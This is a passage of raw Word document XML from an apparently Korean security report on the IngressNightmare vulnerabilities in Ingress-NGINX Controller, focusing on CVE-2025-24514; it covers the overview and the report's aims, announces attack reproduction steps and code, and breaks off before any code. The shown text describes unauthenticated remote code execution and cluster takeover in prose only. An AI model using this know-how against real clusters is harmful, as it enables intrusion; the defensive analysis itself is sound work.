          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공개된</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> IngressNightmare </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시리즈</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개요</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0817EA51" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>2025</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>년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초</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에서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치명적인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보안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취약점들이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연달아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공개되었으며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이들은</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘IngressNightmare’</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>라는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이름으로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불립니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대표적인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취약점으로는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>그리고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가장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심각한</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVE-2025-1974</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1884D5C2" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>이들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취약점은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주로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Admission Webhook</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>과</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정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파일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생성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과정의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취약점을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악용해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인증되지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않은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원격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코드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실행</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(RCE), </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터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내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모든</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근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권한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상승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및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클러스터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전체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장악까지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가능하게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만듭니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자는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악의적으로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조작된</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>객체를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생성해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취약한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컨트롤러에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전달함으로써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클러스터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내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핵심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리소스에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대한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무단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접근과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심각한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피해를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유발할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수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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A19C799" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">IngressNightmare </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시리즈는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가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가진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구조적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취약점과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클라우드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네이티브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인프라의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보안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관리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미흡이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결합될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때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발생할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수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있는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위험을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단적으로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보여줍니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C57158" w14:textId="6A1105D6" w:rsidR="00981A85" w:rsidRPr="00981A85" w:rsidRDefault="00981A85" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00981A85">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">1.4. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>본</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보고서의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>목적</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>범위</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2637347C" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>본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보고서는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에서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발견된</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVE-2025-24514 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점을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중심으로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해당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취약점의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기술적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배경과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발생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원인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공격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시나리오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영향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분석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대응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방안까지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심층적으로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다룹니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE537D7" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>특히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실제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공격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재현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절차와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코드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예시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로그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분석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등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실무에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바로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적용할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수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있는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구체적인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정보를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제공하며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유사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취약점과의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비교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탐지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및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예방을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위한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가이드라인도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함께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제시합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E518D6" w14:textId="77777777" w:rsidR="00C97778" w:rsidRPr="00C97778" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이를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통해</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경을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운영하는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보안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담당자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개발자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인프라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관리자들이</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의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보안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위협을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정확히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이해하고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효과적으로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대응할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수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있도록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지원하는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것을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목표로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합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145CFDD1" w14:textId="77777777" w:rsidR="00C97778" w:rsidRDefault="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="68707A98" w14:textId="383537F8" w:rsidR="00E27F85" w:rsidRPr="00F630FB" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개요</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76603F64" w14:textId="126D9E71" w:rsidR="00F630FB" w:rsidRPr="00F630FB" w:rsidRDefault="00F630FB" w:rsidP="00F630FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">2.1. </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정의</w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C97778" w:rsidRPr="00C97778">
        <w:rPr>
